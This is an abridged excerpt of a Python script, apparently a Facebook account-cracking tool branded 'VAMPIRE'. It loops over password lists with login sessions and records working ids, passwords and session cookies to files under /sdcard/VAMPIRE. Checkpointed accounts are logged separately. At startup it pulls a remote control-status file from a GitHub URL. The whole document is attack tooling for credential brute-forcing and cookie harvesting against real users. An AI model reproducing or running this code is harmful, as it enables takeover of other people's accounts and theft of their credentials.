            ...
            for pw in passlist:
                ...
                with requests.Session() as session:
                    ...
                    if 'session_key' in q:
                        ...
                        print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{ids} {red}| {green}{pas} ")
                        open('/sdcard/VAMPIRE/VAMPIRE-FILE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                        oks.append(ids)
                        break
                    elif 'www.facebook.com' in q:
                        print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {ids} {red}| {green}{pas} ")
                        open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                    else:continue
            loop+=1
...
if __name__ == "__main__":
    cntrl = requests.get('https://raw.githubusercontent.com/VAMPIRE-404/Control-room/main/Control-status/status').text
